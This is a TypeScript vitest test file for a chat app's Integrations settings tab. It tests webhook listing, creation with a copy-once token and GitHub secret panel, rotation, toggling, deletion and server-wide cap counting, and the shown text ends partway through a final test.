import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import type { Mock } from 'vitest';
import { act } from 'react';
import { createRoot, type Root } from 'react-dom/client';
import { AxiosError, type AxiosResponse } from 'axios';
import type { Channel, Webhook, WebhookTarget } from '@voxium/shared';

/**
 * Server settings → Integrations. The list is the SERVER's: fetched on
 * mount, refetched after each mutation and on `webhook:changed` for this
 * server. The create and rotate answers are read once, for the copy-once
 * panel, and the token dies with it. Runs the REAL services/webhooks.ts over
 * a mocked axios instance, so the routes and bodies asserted are the ones
 * the tab actually sends.
 */

// A STABLE t (react-i18next's is): the tab lists it in a hook dependency
const t = (k: string, o?: Record<string, unknown>) => (o ? `${k}${JSON.stringify(o)}` : k);
vi.mock('react-i18next', async (importOriginal) => {
  const actual = await importOriginal<typeof import('react-i18next')>();
  return { ...actual, useTranslation: () => ({ t, i18n: { language: 'en' } }) };
});

const { toastSuccess, toastError, socket, reconnect } = vi.hoisted(() => ({
  toastSuccess: vi.fn(),
  toastError: vi.fn(),
  socket: { on: vi.fn(), off: vi.fn() },
  reconnect: { callbacks: [] as Array<() => void>, unsubscribe: vi.fn() },
}));

vi.mock('../../services/api', () => ({
  api: { get: vi.fn(), post: vi.fn(), patch: vi.fn(), delete: vi.fn() },
  API_BASE: 'http://api.test/api/v1',
}));
vi.mock('../../services/socket', () => ({
  getSocket: () => socket,
  onSocketReconnect: (cb: () => void) => { reconnect.callbacks.push(cb); return reconnect.unsubscribe; },
}));
vi.mock('../../stores/toastStore', () => ({ toast: { success: toastSuccess, error: toastError, info: vi.fn(), warning: vi.fn() } }));

let channels: Channel[] = [];
vi.mock('../../stores/serverStore', () => {
  const state = () => ({ channels });
  const useServerStore = <T,>(sel: (s: ReturnType<typeof state>) => T) => sel(state());
  useServerStore.getState = state;
  return { useServerStore };
});

import { api } from '../../services/api';
import { toast } from '../../stores/toastStore';
import { IntegrationsTab } from '../../components/server/IntegrationsTab';

(globalThis as { IS_REACT_ACT_ENVIRONMENT?: boolean }).IS_REACT_ACT_ENVIRONMENT = true;

const mockGet = api.get as unknown as Mock;
const mockPost = api.post as unknown as Mock;
const mockPatch = api.patch as unknown as Mock;
const mockDelete = api.delete as unknown as Mock;

const channel = (id: string, name: string, extra: Partial<Channel> = {}): Channel => ({
  id, name, type: 'text', serverId: 'srv-1', categoryId: null, position: 0, createdAt: '2026-01-01T00:00:00.000Z', ...extra,
});

const DAY = 86_400_000;
const SECRET = 'a3f1'.repeat(16);
const SECRET_ROTATED = '9e0c'.repeat(16);
const hook = (id: string, extra: Partial<Webhook> = {}): Webhook => ({
  id, serverId: 'srv-1', channelId: 'ch-1', name: id === 'wh-1' ? 'CI' : 'Deploy bot', type: 'generic', enabled: true,
  createdBy: { id: 'u-1', username: 'alice', displayName: 'Alice' }, createdAt: '2026-10-01T00:00:00.000Z', lastUsedAt: null,
  adminDisabledAt: null, creatorRemovedAt: null, lastRotatedAt: null, lastRotatedBy: null, ...extra,
});
const target = (id: string, name: string, position = 0): WebhookTarget => ({ id, name, categoryId: null, position });

function axiosError(status: number, error: string): AxiosError {
  return new AxiosError('Request failed', String(status), undefined, undefined, {
    status, statusText: '', headers: {}, config: {} as never, data: { success: false, error },
  } as AxiosResponse);
}

let list: Webhook[];
// The server-wide count the GET answers next to the visible rows. null: the
// visible rows are all of them; 'absent': an older server that sends none.
let listTotal: number | 'absent' | null;
let maxWebhooks: number;
let listAnswer: (() => Promise<unknown>) | null;
const listBody = () => ({ success: true, data: list, ...(listTotal === 'absent' ? {} : { total: listTotal ?? list.length }) });
const listCalls = () => mockGet.mock.calls.filter(([url]) => url === '/servers/srv-1/webhooks').length;
// The create picker's list (GET …/webhooks/targets): what the server's create check accepts for this caller
let targets: WebhookTarget[];
let targetsAnswer: (() => Promise<unknown>) | null;
const targetsCalls = () => mockGet.mock.calls.filter(([url]) => url === '/servers/srv-1/webhooks/targets').length;

let container: HTMLDivElement;
let root: Root;
const q = (sel: string) => document.body.querySelector(sel) as HTMLElement | null;
const row = (id: string) => q(`[data-testid="webhook-row-${id}"]`)!;
const inRow = (id: string, testId: string) => row(id).querySelector(`[data-testid="${testId}"]`) as HTMLElement | null;

async function flush() {
  for (let i = 0; i < 6; i++) await act(async () => { await Promise.resolve(); });
}
async function render() {
  await act(async () => { root.render(<IntegrationsTab serverId="srv-1" />); });
  await flush();
}
async function click(el: Element | null) {
  expect(el, 'element to click').not.toBeNull();
  await act(async () => { (el as HTMLElement).click(); });
  await flush();
}
async function type(el: HTMLInputElement, value: string) {
  await act(async () => {
    Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, 'value')!.set!.call(el, value);
    el.dispatchEvent(new Event('input', { bubbles: true }));
  });
}
async function pick(el: HTMLSelectElement, value: string) {
  await act(async () => {
    Object.getOwnPropertyDescriptor(HTMLSelectElement.prototype, 'value')!.set!.call(el, value);
    el.dispatchEvent(new Event('change', { bubbles: true }));
  });
}
async function key(keyName: string, init: KeyboardEventInit = {}) {
  await act(async () => { document.dispatchEvent(new KeyboardEvent('keydown', { key: keyName, bubbles: true, ...init })); });
}
const changedHandlers = () => socket.on.mock.calls.filter(([e]) => e === 'webhook:changed').map(([, h]) => h as (d: { serverId: string }) => void);

beforeEach(() => {
  vi.clearAllMocks();
  reconnect.callbacks = [];
  channels = [
    channel('ch-1', 'general'),
    channel('ch-2', 'deploys'),
    channel('ch-sec', 'vault', { secure: true }),
    channel('ch-voice', 'Lounge', { type: 'voice' }),
    channel('ch-elsewhere', 'elsewhere', { serverId: 'srv-2' }),
  ];
  list = [
    hook('wh-1', { lastUsedAt: new Date(Date.now() - 3 * DAY).toISOString() }),
    hook('wh-2', { type: 'github', enabled: false, channelId: 'ch-gone', createdBy: null }),
  ];
  listTotal = null;
  maxWebhooks = 10;
  listAnswer = null;
  targets = [target('ch-1', 'general', 0), target('ch-2', 'deploys', 1)];
  targetsAnswer = null;
  mockGet.mockImplementation((url: string) => {
    if (url === '/servers/srv-1/webhooks') return listAnswer ? listAnswer() : Promise.resolve({ data: listBody() });
    if (url === '/servers/srv-1/webhooks/targets') return targetsAnswer ? targetsAnswer() : Promise.resolve({ data: { success: true, data: targets } });
    if (url === '/servers/srv-1/limits') {
      return Promise.resolve({ data: { success: true, data: { maxChannelsPerServer: 20, maxVoiceUsersPerChannel: 12, maxCategoriesPerServer: 12, maxMembersPerServer: 0, maxWebhooksPerServer: maxWebhooks } } });
    }
    return Promise.reject(new Error(`unexpected GET ${url}`));
  });
  Object.defineProperty(window, 'isSecureContext', { value: true, configurable: true });
  Object.defineProperty(navigator, 'clipboard', { value: { writeText: vi.fn().mockResolvedValue(undefined) }, configurable: true });
  container = document.createElement('div');
  document.body.appendChild(container);
  root = createRoot(container);
});
afterEach(() => {
  act(() => root.unmount());
  container.remove();
});

describe('IntegrationsTab — the list', () => {
  it('renders each row: name, type chip, #channel, creator, last use; a disabled one dimmed with its chip', async () => {
    await render();
    expect(q('[data-testid="integrations-count"]')!.textContent).toContain('webhooks.usage{"used":2,"max":10}');

    expect(inRow('wh-1', 'webhook-name')!.textContent).toBe('CI');
    expect(inRow('wh-1', 'webhook-type')!.textContent).toBe('webhooks.typeGeneric');
    expect(inRow('wh-1', 'webhook-channel')!.textContent).toBe('general');
    expect(inRow('wh-1', 'webhook-creator')!.textContent).toBe('webhooks.createdBy{"name":"Alice"}');
    expect(inRow('wh-1', 'webhook-last-used')!.textContent).toBe('webhooks.lastUsed{"when":"3 days ago"}');
    expect(inRow('wh-1', 'webhook-disabled')).toBeNull();
    expect(row('wh-1').className).not.toContain('opacity-60');

    expect(inRow('wh-2', 'webhook-type')!.textContent).toBe('webhooks.typeGithub');
    expect(inRow('wh-2', 'webhook-channel')).toBeNull();
    expect(inRow('wh-2', 'webhook-channel-missing')!.textContent).toBe('webhooks.channelMissing');
    expect(inRow('wh-2', 'webhook-creator')!.textContent).toBe('webhooks.createdByUnknown');
    expect(inRow('wh-2', 'webhook-last-used')!.textContent).toBe('webhooks.neverUsed');
    expect(inRow('wh-2', 'webhook-disabled')!.textContent).toBe('webhooks.disabledChip');
    expect(row('wh-2').className).toContain('opacity-60');
    expect(row('wh-2').getAttribute('data-enabled')).toBe('false');

    // the row actions are named for assistive tech
    expect(inRow('wh-1', 'webhook-rotate')!.getAttribute('aria-label')).toBe('webhooks.actions.rotate');
    expect(inRow('wh-1', 'webhook-toggle')!.getAttribute('aria-label')).toBe('webhooks.actions.disable');
    expect(inRow('wh-2', 'webhook-toggle')!.getAttribute('aria-label')).toBe('webhooks.actions.enable');
    expect(inRow('wh-1', 'webhook-delete')!.getAttribute('aria-label')).toBe('webhooks.actions.delete');
  });

  it('an empty server shows the empty state, a loading one the spinner', async () => {
    let resolve!: (v: unknown) => void;
    listAnswer = () => new Promise((r) => { resolve = r; });
    await render();
    expect(q('[data-testid="integrations-loading"]')).not.toBeNull();
    expect((q('[data-testid="webhook-new"]') as HTMLButtonElement).disabled).toBe(true);
    await act(async () => { resolve({ data: { success: true, data: [] } }); });
    await flush();
    expect(q('[data-testid="integrations-empty"]')!.textContent).toContain('webhooks.empty');
    expect((q('[data-testid="webhook-new"]') as HTMLButtonElement).disabled).toBe(false);
  });

  it('a failed load is toasted (translated) and offers a retry that refetches', async () => {
    listAnswer = () => Promise.reject(axiosError(500, 'boom'));
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {});
    await render();
    expect(toastError).toHaveBeenCalledWith('boom');
    expect(q('[data-testid="integrations-error"]')).not.toBeNull();
    listAnswer = null;
    await click(q('[data-testid="integrations-error"] button'));
    expect(row('wh-1')).not.toBeNull();
    expect(warn).toHaveBeenCalled();
    warn.mockRestore();
  });

  it('the cap disables "New webhook" with the reason as its title; a cap of 0 says creation is frozen', async () => {
    maxWebhooks = 2;
    await render();
    let button = q('[data-testid="webhook-new"]') as HTMLButtonElement;
    expect(button.disabled).toBe(true);
    expect(button.title).toBe('webhooks.atCap{"max":2}');
    expect(q('[data-testid="integrations-cap"]')!.textContent).toBe('webhooks.atCap{"max":2}');

    act(() => root.unmount());
    root = createRoot(container);
    maxWebhooks = 0;
    list = [];
    await render();
    button = q('[data-testid="webhook-new"]') as HTMLButtonElement;
    expect(button.disabled).toBe(true);
    expect(button.title).toBe('webhooks.frozen');
  });

  it('below the cap the button is enabled with no title', async () => {
    maxWebhooks = 3;
    await render();
    const button = q('[data-testid="webhook-new"]') as HTMLButtonElement;
    expect(button.disabled).toBe(false);
    expect(button.title).toBe('');
  });
});

describe('IntegrationsTab — the OFF state', () => {
  it('the exact flag-off 403 renders "turned off", with no error toast', async () => {
    listAnswer = () => Promise.reject(axiosError(403, 'Webhooks are currently disabled'));
    await render();
    const off = q('[data-testid="integrations-off"]')!;
    expect(off.textContent).toContain('webhooks.off.title');
    expect(off.textContent).toContain('webhooks.off.hint');
    expect(q('[data-testid="webhook-list"]')).toBeNull();
    expect(toastError).not.toHaveBeenCalled();
  });

  it('another 403 is an error, not the OFF state', async () => {
    listAnswer = () => Promise.reject(axiosError(403, 'You do not have permission to manage webhooks'));
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {});
    await render();
    expect(q('[data-testid="integrations-off"]')).toBeNull();
    expect(toastError).toHaveBeenCalledWith(expect.stringContaining('serverErrors.webhookNoPermission'));
    warn.mockRestore();
  });

  it('a mutation answered with the flag-off 403 flips the tab off too', async () => {
    await render();
    mockPatch.mockRejectedValue(axiosError(403, 'Webhooks are currently disabled'));
    listAnswer = () => Promise.reject(axiosError(403, 'Webhooks are currently disabled'));
    await click(inRow('wh-1', 'webhook-toggle'));
    expect(q('[data-testid="integrations-off"]')).not.toBeNull();
    expect(toastError).not.toHaveBeenCalled();
  });
});

describe('IntegrationsTab — webhook:changed', () => {
  it('a hint for this server refetches; one for another server does not', async () => {
    await render();
    expect(listCalls()).toBe(1);
    expect(changedHandlers()).toHaveLength(1);
    const [handler] = changedHandlers();

    await act(async () => { handler({ serverId: 'srv-2' }); });
    await flush();
    expect(listCalls()).toBe(1);

    list = [hook('wh-1'), hook('wh-2'), hook('wh-3', { name: 'Cron' })];
    await act(async () => { handler({ serverId: 'srv-1' }); });
    await flush();
    expect(listCalls()).toBe(2);
    expect(row('wh-3')).not.toBeNull();
  });

  it('a reconnect refetches (events may have been missed)', async () => {
    await render();
    expect(reconnect.callbacks).toHaveLength(1);
    await act(async () => { reconnect.callbacks[0](); });
    await flush();
    expect(listCalls()).toBe(2);
  });

  it('unsubscribes on unmount: the same handler comes off, the reconnect hook is released', async () => {
    await render();
    const [handler] = changedHandlers();
    act(() => root.unmount());
    expect(socket.off).toHaveBeenCalledWith('webhook:changed', handler);
    expect(reconnect.unsubscribe).toHaveBeenCalled();
    root = createRoot(container);
  });
});

describe('IntegrationsTab — create and the copy-once panel', () => {
  it('the channel picker offers this server\'s plaintext text channels only (no secure, no voice, no other server)', async () => {
    await render();
    await click(q('[data-testid="webhook-new"]'));
    const options = [...(q('[data-testid="webhook-create-channel"]') as HTMLSelectElement).options].map((o) => o.value);
    expect(options).toEqual(['ch-1', 'ch-2']);
  });

  it('with no eligible channel the dialog says so and cannot submit', async () => {
    channels = [channel('ch-sec', 'vault', { secure: true }), channel('ch-voice', 'Lounge', { type: 'voice' })];
    targets = [];
    await render();
    await click(q('[data-testid="webhook-new"]'));
    expect(q('[data-testid="webhook-no-channels"]')!.textContent).toBe('webhooks.create.noChannels');
    expect((q('[data-testid="webhook-create-submit"]') as HTMLButtonElement).disabled).toBe(true);
  });

  it('POSTs the exact body, then shows the URL composed on the client, the curl line, and copies them', async () => {
    mockPost.mockResolvedValue({ data: { success: true, data: { ...hook('wh-new', { name: 'Nightly' }), token: 'tok-1' } } });
    await render();
    await click(q('[data-testid="webhook-new"]'));
    await type(q('#webhook-name') as HTMLInputElement, '  Nightly  ');
    await pick(q('[data-testid="webhook-create-channel"]') as HTMLSelectElement, 'ch-2');
    await click(q('[data-testid="webhook-create-submit"]'));

    expect(mockPost).toHaveBeenCalledWith('/servers/srv-1/webhooks', { channelId: 'ch-2', name: 'Nightly', type: 'generic' });
    expect(q('[data-testid="webhook-create-dialog"]')).toBeNull();

    const url = 'http://api.test/api/v1/webhooks/wh-new/tok-1';
    expect(q('[data-testid="webhook-reveal"]')!.textContent).toContain('webhooks.reveal.title{"name":"Nightly"}');
    expect(q('[data-testid="webhook-reveal-warning"]')!.textContent).toBe('webhooks.reveal.copyNow');
    expect(q('[data-testid="webhook-reveal-url"]')!.textContent).toBe(url);
    expect(q('[data-testid="webhook-reveal"]')!.textContent).toContain('webhooks.reveal.worksWith');
    // the URL is single-quoted: nothing in it reaches the shell
    expect(q('[data-testid="webhook-reveal-curl"]')!.textContent).toBe(`curl -H 'content-type: application/json' -d '{"content":"hello from cron"}' '${url}'`);
    expect(q('[data-testid="webhook-reveal-secret"]')).toBeNull();
    // no secret, no GitHub setup: the generic hint and the curl line stay
    expect(q('[data-testid="github-setup"]')).toBeNull();
    expect(q('[data-testid="webhook-reveal"]')!.textContent).not.toContain('webhooks.reveal.github.');
    // the list came from the server again, not from the 201
    expect(listCalls()).toBe(2);

    await click(q('[data-testid="webhook-reveal-url-copy"]'));
    expect(navigator.clipboard.writeText).toHaveBeenLastCalledWith(url);
    expect(toastSuccess).toHaveBeenLastCalledWith('webhooks.reveal.copied');
    await click(q('[data-testid="webhook-reveal-curl-copy"]'));
    expect(navigator.clipboard.writeText).toHaveBeenLastCalledWith(expect.stringContaining(`-d '{"content":"hello from cron"}' '${url}'`));

    // closing drops the token: it is nowhere on the page any more
    await click(q('[data-testid="webhook-reveal-done"]'));
    expect(q('[data-testid="webhook-reveal"]')).toBeNull();
    expect(document.body.innerHTML).not.toContain('tok-1');
  });

  it('a failed clipboard write is toasted, never silent', async () => {
    mockPost.mockResolvedValue({ data: { success: true, data: { ...hook('wh-new'), token: 'tok-1' } } });
    (navigator.clipboard.writeText as Mock).mockRejectedValue(new Error('denied'));
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {});
    await render();
    await click(q('[data-testid="webhook-new"]'));
    await type(q('#webhook-name') as HTMLInputElement, 'CI');
    await click(q('[data-testid="webhook-create-submit"]'));
    await click(q('[data-testid="webhook-reveal-url-copy"]'));
    expect(toastError).toHaveBeenCalledWith('webhooks.reveal.copyFailed');
    warn.mockRestore();
  });

  it('a GitHub webhook: the secret, then GitHub\'s settings field by field, and no curl line', async () => {
    mockPost.mockResolvedValue({ data: { success: true, data: { ...hook('wh-gh', { type: 'github', name: 'Repo' }), token: 'tok-gh', secret: SECRET } } });
    await render();
    await click(q('[data-testid="webhook-new"]'));
    await type(q('#webhook-name') as HTMLInputElement, 'Repo');
    await click(q('[data-testid="webhook-type-github"]'));
    await click(q('[data-testid="webhook-create-submit"]'));
    expect(mockPost).toHaveBeenCalledWith('/servers/srv-1/webhooks', { channelId: 'ch-1', name: 'Repo', type: 'github' });

    const url = 'http://api.test/api/v1/webhooks/wh-gh/tok-gh';
    const panel = q('[data-testid="webhook-reveal"]')!;
    expect(q('#webhook-reveal-title')!.textContent).toBe('webhooks.reveal.title{"name":"Repo"}');
    // both are shown once, and the warning says so
    expect(q('[data-testid="webhook-reveal-warning"]')!.textContent).toBe('webhooks.reveal.github.copyNow');
    expect(q('[data-testid="webhook-reveal-url"]')!.textContent).toBe(url);
    expect(q('[data-testid="webhook-reveal-secret"]')!.textContent).toBe(SECRET);
    // GitHub wording instead of the Discord hint, and no curl line: an unsigned POST is refused
    expect(panel.textContent).toContain('webhooks.reveal.github.urlHint');
    expect(panel.textContent).not.toContain('webhooks.reveal.worksWith');
    expect(q('[data-testid="webhook-reveal-curl"]')).toBeNull();
    expect(panel.textContent).not.toContain('webhooks.reveal.curlHint');
    expect(panel.textContent).not.toContain('curl ');

    const setup = q('[data-testid="github-setup"]')!;
    expect(setup).not.toBeNull();
    expect(setup.querySelector('h3')!.textContent).toBe('webhooks.reveal.github.title');
    expect(setup.textContent).toContain('webhooks.reveal.github.intro');
    // the exact settings in the order of GitHub's form, each a label then its value
    expect([...setup.querySelectorAll('ol > li')].map((li) => li.getAttribute('data-testid'))).toEqual([
      'github-setup-url', 'github-setup-content-type', 'github-setup-secret', 'github-setup-ssl', 'github-setup-events',
    ]);
    const step = (id: string) => setup.querySelector(`[data-testid="github-setup-${id}"]`)!.textContent;
    expect(step('url')).toBe(`webhooks.reveal.github.payloadUrl${url}`);
    expect(step('content-type')).toBe('webhooks.reveal.github.contentTypeapplication/json');
    expect(step('secret')).toBe(`webhooks.reveal.github.secret${SECRET}`);
    expect(step('ssl')).toBe('webhooks.reveal.github.sslwebhooks.reveal.github.sslValue');
    const events = setup.querySelector('[data-testid="github-setup-events"]')!;
    expect(events.textContent).toContain('webhooks.reveal.github.events');
    expect(events.textContent).toContain('webhooks.reveal.github.eventsValue');
    expect([...events.querySelectorAll('ul > li')].map((li) => li.textContent)).toEqual([
      'webhooks.reveal.github.eventPushes', 'webhooks.reveal.github.eventPullRequests',
      'webhooks.reveal.github.eventIssues', 'webhooks.reveal.github.eventReleases',
    ]);
    // the ping GitHub sends on save is the immediate check; the secret is not optional
    expect(q('[data-testid="github-setup-check"]')!.textContent).toBe('webhooks.reveal.github.ping');
    expect(setup.textContent).not.toContain('webhooks.reveal.github.rotatedCheck');
    expect(q('[data-testid="github-setup-secret-required"]')!.textContent).toBe('webhooks.reveal.github.secretRequired');
    // the URL and the secret are referenced, not offered again: the only copy buttons are the blocks above
    expect(setup.querySelectorAll('button')).toHaveLength(0);
    expect(document.activeElement).toBe(q('[data-testid="webhook-reveal-url-copy"]'));

    await click(q('[data-testid="webhook-reveal-secret-copy"]'));
    expect(navigator.clipboard.writeText).toHaveBeenLastCalledWith(SECRET);
    expect(toastSuccess).toHaveBeenLastCalledWith('webhooks.reveal.copied');

    // closing drops both: neither is anywhere on the page any more
    await click(q('[data-testid="webhook-reveal-done"]'));
    expect(q('[data-testid="webhook-reveal"]')).toBeNull();
    expect(document.body.innerHTML).not.toContain(SECRET);
    expect(document.body.innerHTML).not.toContain('tok-gh');
  });

  it('the name is validated before the request: an empty one never reaches the server', async () => {
    await render();
    await click(q('[data-testid="webhook-new"]'));
    await type(q('#webhook-name') as HTMLInputElement, '   ');
    await click(q('[data-testid="webhook-create-submit"]'));
    expect(mockPost).not.toHaveBeenCalled();
    expect(q('[data-testid="webhook-name-error"]')!.textContent).toContain('serverErrors.webhookNameEmpty');
    expect(q('[data-testid="webhook-create-dialog"]')).not.toBeNull();
  });

  it('GitHub on a server with no encryption key: its 503 comes back as a translated toast and the dialog stays open', async () => {
    mockPost.mockRejectedValue(axiosError(503, 'GitHub webhooks are not configured on this server'));
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {});
    await render();
    await click(q('[data-testid="webhook-new"]'));
    await type(q('#webhook-name') as HTMLInputElement, 'Repo');
    await click(q('[data-testid="webhook-type-github"]'));
    await click(q('[data-testid="webhook-create-submit"]'));
    expect(mockPost).toHaveBeenCalledWith('/servers/srv-1/webhooks', { channelId: 'ch-1', name: 'Repo', type: 'github' });
    expect(toastError).toHaveBeenCalledTimes(1);
    expect(toastError).toHaveBeenCalledWith(expect.stringMatching(/^serverErrors\.webhookGithubNotConfigured\{/));
    expect(q('[data-testid="webhook-create-dialog"]')).not.toBeNull();
    expect(q('[data-testid="webhook-reveal"]')).toBeNull();
    warn.mockRestore();
  });

  it('the variable cap message is translated with the server\'s number', async () => {
    mockPost.mockRejectedValue(axiosError(400, 'Server can have at most 3 webhooks'));
    await render();
    await click(q('[data-testid="webhook-new"]'));
    await type(q('#webhook-name') as HTMLInputElement, 'CI');
    await click(q('[data-testid="webhook-create-submit"]'));
    expect(toastError).toHaveBeenCalledWith(expect.stringMatching(/^serverErrors\.webhookCap.*"max":3/));
  });

  it('Escape closes the dialog; Tab cycles inside it', async () => {
    await render();
    await click(q('[data-testid="webhook-new"]'));
    const dialog = q('[data-testid="webhook-create-dialog"]')!;
    // the name field took focus on open
    expect(document.activeElement).toBe(q('#webhook-name'));
    const submit = q('[data-testid="webhook-create-submit"]')!;
    submit.focus();
    await key('Tab');
    expect(dialog.contains(document.activeElement)).toBe(true);
    expect(document.activeElement).not.toBe(submit);
    await key('Escape');
    expect(q('[data-testid="webhook-create-dialog"]')).toBeNull();
  });
});

describe('IntegrationsTab — rotate, enable/disable, delete', () => {
  it('rotate asks first, POSTs /rotate, then opens the panel with the NEW url', async () => {
    mockPost.mockResolvedValue({ data: { success: true, data: { ...hook('wh-1'), token: 'tok-rotated' } } });
    await render();
    await click(inRow('wh-1', 'webhook-rotate'));
    expect(q('[data-testid="webhook-rotate-dialog"]')!.textContent).toContain('webhooks.rotate.body{"name":"CI"}');
    expect(mockPost).not.toHaveBeenCalled();
    await click(q('[data-testid="webhook-rotate-dialog-confirm"]'));
    expect(mockPost).toHaveBeenCalledWith('/servers/srv-1/webhooks/wh-1/rotate');
    expect(q('[data-testid="webhook-rotate-dialog"]')).toBeNull();
    expect(q('[data-testid="webhook-reveal"]')!.textContent).toContain('webhooks.reveal.rotatedTitle{"name":"CI"}');
    expect(q('[data-testid="webhook-reveal-url"]')!.textContent).toBe('http://api.test/api/v1/webhooks/wh-1/tok-rotated');
    expect(q('[data-testid="github-setup"]')).toBeNull();
    expect(q('[data-testid="webhook-reveal-curl"]')).not.toBeNull();
    expect(listCalls()).toBe(2);
  });

  it('rotating a GitHub webhook: the confirm says the secret goes too; the panel shows the new URL AND secret with the update steps', async () => {
    mockPost.mockResolvedValue({ data: { success: true, data: { ...hook('wh-2', { type: 'github' }), token: 'tok-gh2', secret: SECRET_ROTATED } } });
    await render();
    await click(inRow('wh-2', 'webhook-rotate'));
    const confirmText = q('[data-testid="webhook-rotate-dialog"]')!.textContent;
    expect(confirmText).toContain('webhooks.rotate.bodyGithub{"name":"Deploy bot"}');
    expect(confirmText).not.toContain('webhooks.rotate.body{');
    await click(q('[data-testid="webhook-rotate-dialog-confirm"]'));
    expect(mockPost).toHaveBeenCalledWith('/servers/srv-1/webhooks/wh-2/rotate');

    const url = 'http://api.test/api/v1/webhooks/wh-2/tok-gh2';
    // the heading says both changed
    expect(q('#webhook-reveal-title')!.textContent).toBe('webhooks.reveal.github.rotatedTitle{"name":"Deploy bot"}');
    expect(q('[data-testid="webhook-reveal-warning"]')!.textContent).toBe('webhooks.reveal.github.copyNow');
    expect(q('[data-testid="webhook-reveal-url"]')!.textContent).toBe(url);
    expect(q('[data-testid="webhook-reveal-secret"]')!.textContent).toBe(SECRET_ROTATED);
    const setup = q('[data-testid="github-setup"]')!;
    // ...and GitHub's settings must take both
    expect(setup.querySelector('h3')!.textContent).toBe('webhooks.reveal.github.updateTitle');
    expect(setup.textContent).toContain('webhooks.reveal.github.rotatedIntro');
    expect(setup.textContent).not.toContain('webhooks.reveal.github.intro');
    expect(setup.querySelector('[data-testid="github-setup-url"]')!.textContent).toBe(`webhooks.reveal.github.payloadUrl${url}`);
    expect(setup.querySelector('[data-testid="github-setup-secret"]')!.textContent).toBe(`webhooks.reveal.github.secret${SECRET_ROTATED}`);
    // GitHub sends no ping when a hook is edited: the panel does not promise one
    expect(q('[data-testid="github-setup-check"]')!.textContent).toBe('webhooks.reveal.github.rotatedCheck');
    expect(setup.textContent).not.toContain('webhooks.reveal.github.ping');
    expect(q('[data-testid="github-setup-secret-required"]')).not.toBeNull();
    expect(q('[data-testid="webhook-reveal-curl"]')).toBeNull();
    expect(document.activeElement).toBe(q('[data-testid="webhook-reveal-url-copy"]'));
  });

  it('cancelling the rotate confirm sends nothing', async () => {
    await render();
    await click(inRow('wh-1', 'webhook-rotate'));
    await key('Escape');
    expect(q('[data-testid="webhook-rotate-dialog"]')).toBeNull();
    expect(mockPost).not.toHaveBeenCalled();
  });

  it('enable/disable PATCHes { enabled } with the flipped value and refetches', async () => {
    mockPatch.mockResolvedValue({ data: { success: true, data: hook('wh-1', { enabled: false }) } });
    await render();
    await click(inRow('wh-1', 'webhook-toggle'));
    expect(mockPatch).toHaveBeenLastCalledWith('/servers/srv-1/webhooks/wh-1', { enabled: false });
    await click(inRow('wh-2', 'webhook-toggle'));
    expect(mockPatch).toHaveBeenLastCalledWith('/servers/srv-1/webhooks/wh-2', { enabled: true });
    expect(listCalls()).toBe(3);
  });

  it('a refused toggle is toasted, translated', async () => {
    mockPatch.mockRejectedValue(axiosError(404, 'Webhook not found'));
    await render();
    await click(inRow('wh-1', 'webhook-toggle'));
    expect(toastError).toHaveBeenCalledWith(expect.stringContaining('serverErrors.webhookNotFound'));
  });

  it('delete without the checkbox: DELETE without purge, a plain toast', async () => {
    mockDelete.mockResolvedValue({ data: { success: true, data: { deletedMessages: 0 } } });
    await render();
    await click(inRow('wh-1', 'webhook-delete'));
    const dialog = q('[data-testid="webhook-delete-dialog"]')!;
    expect(dialog.textContent).toContain('webhooks.delete.body{"name":"CI"}');
    expect((q('[data-testid="webhook-delete-purge"]') as HTMLInputElement).checked).toBe(false);
    await click(q('[data-testid="webhook-delete-dialog-confirm"]'));
    expect(mockDelete).toHaveBeenCalledWith('/servers/srv-1/webhooks/wh-1', undefined);
    expect(toastSuccess).toHaveBeenCalledWith('webhooks.delete.deleted{"name":"CI"}');
    expect(q('[data-testid="webhook-delete-dialog"]')).toBeNull();
    expect(listCalls()).toBe(2);
  });

  it('delete with "Also delete its messages": ?purge=1, and the toast says how many went', async () => {
    mockDelete.mockResolvedValue({ data: { success: true, data: { deletedMessages: 4 } } });
    await render();
    await click(inRow('wh-1', 'webhook-delete'));
    await click(q('[data-testid="webhook-delete-purge"]'));
    await click(q('[data-testid="webhook-delete-dialog-confirm"]'));
    expect(mockDelete).toHaveBeenCalledWith('/servers/srv-1/webhooks/wh-1', { params: { purge: '1' } });
    expect(toastSuccess).toHaveBeenCalledWith('webhooks.delete.deletedMessages{"count":4,"name":"CI"}');
  });

  it('the purge checkbox does not carry over to the next delete', async () => {
    await render();
    await click(inRow('wh-1', 'webhook-delete'));
    await click(q('[data-testid="webhook-delete-purge"]'));
    await key('Escape');
    await click(inRow('wh-2', 'webhook-delete'));
    expect((q('[data-testid="webhook-delete-purge"]') as HTMLInputElement).checked).toBe(false);
  });
});

describe("IntegrationsTab — the count is the server's, not the visible rows", () => {
  it('webhooks on channels the viewer cannot see fill the cap too: "N of M" and "New webhook" use the server total', async () => {
    // two visible rows, ten on the server: the server is full
    listTotal = 10;
    await render();
    expect(q('[data-testid="webhook-list"]')!.querySelectorAll('li')).toHaveLength(2);
    expect(q('[data-testid="integrations-count"]')!.textContent).toContain('webhooks.usage{"used":10,"max":10}');
    const button = q('[data-testid="webhook-new"]') as HTMLButtonElement;
    expect(button.disabled).toBe(true);
    expect(button.title).toBe('webhooks.atCap{"max":10}');
    expect(q('[data-testid="integrations-cap"]')).not.toBeNull();
  });

  it('below the cap with hidden ones counted, the button stays enabled', async () => {
    listTotal = 9;
    await render();
    expect(q('[data-testid="integrations-count"]')!.textContent).toContain('webhooks.usage{"used":9,"max":10}');
    expect((q('[data-testid="webhook-new"]') as HTMLButtonElement).disabled).toBe(false);
  });

  it('an older server that sends no total: the visible rows are the count', async () => {
    listTotal = 'absent';
    maxWebhooks = 2;
    await render();
    expect(q('[data-testid="integrations-count"]')!.textContent).toContain('webhooks.usage{"used":2,"max":2}');
    expect((q('[data-testid="webhook-new"]') as HTMLButtonElement).disabled).toBe(true);
  });

  it("a refetch moves the total (a fellow moderator's create on a hidden channel)", async () => {
    await render();
    expect(q('[data-testid="integrations-count"]')!.textContent).toContain('"used":2');
    listTotal = 10;
    const [handler] = changedHandlers();
    await act(async () => { handler({ serverId: 'srv-1' }); });
    await flush();
    expect(q('[data-testid="integrations-count"]')!.textContent).toContain('webhooks.usage{"used":10,"max":10}');
